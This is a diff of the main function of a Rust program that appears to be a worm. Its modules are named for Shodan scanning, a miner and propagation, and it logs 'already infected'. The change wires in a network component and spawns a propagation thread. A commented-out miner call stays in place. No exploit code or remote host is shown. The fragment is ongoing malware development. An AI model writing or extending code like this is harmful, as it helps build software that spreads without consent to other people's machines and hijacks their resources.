@@ -6,6 +6,7 @@ mod shodan;
 mod miner;
 mod mutex;
 
+use network::Network;
 use miner::Miner;
 
 use env_logger::{Builder, Env};
@@ -31,9 +32,15 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             miner.run()?;
             */
 
-            // propogate::run()
+            let mut network = Network::new();
 
-            loop {}
+            let propogate = propogate::spawn(network.should_close());
+
+            network.run()?;
+
+            info!("waiting for propogate to finish");
+
+            let _ = propogate.join();
         },
         None => {
             warn!("already infected");
